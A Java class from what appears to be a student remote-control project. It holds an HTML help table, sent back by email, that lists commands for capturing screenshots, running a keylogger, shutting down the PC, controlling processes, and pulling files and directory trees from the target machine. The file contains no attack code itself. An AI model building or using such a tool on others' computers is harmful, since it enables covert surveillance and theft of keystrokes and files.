package services;

import socket.SendMail;

public class GuideTable {
    private static String content = """
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <title>Command List</title>
                        <style>
                            /* Thêm CSS nếu cần */
                            table {
                                border-collapse: collapse;
                                width: 100%;
                            }
                            th, td {
                                border: 1px solid black;
                                padding: 8px;
                                text-align: left;
                            }
                        </style>
                    </head>
                    <body>
                    
            <table border="1">
                <tr>
                    <th>No</th>
                    <th>Type</th>
                    <th>Command</th>
                    <th>Description</th>
                    <th>Example</th>
                </tr>
                <tr>
                    <td>1</td>
                    <td>GUIDE</td>
                    <td>help</td>
                    <td>Display the list of commands along with their descriptions</td>
                    <td>help</td>
                </tr>
                <tr>
                    <td>2</td>
                    <td>SCREENSHOT</td>
                    <td>screenshot</td>
                    <td>Capture a screenshot of the user’s PC</td>
                    <td>screenshot</td>
                </tr>
                <tr>
                    <td>3</td>
                    <td rowspan="2">CONTROL PC</td>
                    <td>shutdown</td>
                    <td>Shutdown the user’s PC</td>
                    <td>shutdown</td>
                </tr>
                <tr>
                    <td>4</td>
                    <td>restart</td>
                    <td>Restart the user’s PC</td>
                    <td>restart</td>
                </tr>
                <tr>
                    <td>5</td>
                    <td rowspan="2">KEYLOGGER</td>
                    <td>startkeylogger</td>
                    <td>Start the process of capturing keystrokes typed into user’s computer</td>
                    <td>startkeylogger</td>
                </tr>
                <tr>
                    <td>6</td>
                    <td>stopkeylogger</td>
                    <td>Stop the process of capturing keystrokes typed into user’s computer</td>
                    <td>stopkeylogger</td>
                </tr>
                <tr>
                    <td>7</td>
                    <td rowspan="3">PROCESS</td>
                    <td>listprocess</td>
                    <td>Get the list of processes currently running on the user’s devices</td>
                    <td>listprocess</td>
                </tr>
                <tr>
                    <td>8</td>
                    <td>startapp&&amp;&lt;app_name&gt;</td>
                    <td>Open a specified application</td>
                    <td>startapp&amp;&amp;mspaint.exe</td>
                </tr>
                <tr>
                    <td>9</td>
                    <td>stopapp&&amp;&lt;app_name&gt;</td>
                    <td>Close a specified application</td>
                    <td>stopapp&amp;&amp;mspaint.exe</td>
                </tr>
                
                <tr>
                    <td>10</td>
                    <td rowspan="2">FILE</td>
                    <td>getfile[1]&&amp;&lt;file_name&gt;</td>
                    <td>Get a specified file by filename</td>
                    <td>getfile&amp;&amp;D:\\IT\\mmt.txt</td>
                </tr>
                
                <tr>
                    <td>11</td>
                    <td>getfile[2]&&amp;&lt;file_path&gt;</td>
                    <td>Get a specified file by path to the file</td>
                    <td>getfile&amp;&amp;D:\\IT\\mmt.txt</td>
                </tr>
                <tr>
                    <td>12</td>
                    <td>DIRECTORY</td>
                    <td>exploredirectory&&<dir_path></td>
                    <td>Display entire specified directory as a tree</td>
                    <td>exploredirectory&&D:\\IT</td>
                </tr>
            </table>
                               
                    </body>
                    </html>

                    """;
    public static void requestGuide(String from){
        SendMail.serversendEmail(from, "Reply for request: Help", "",
                content);
    }
}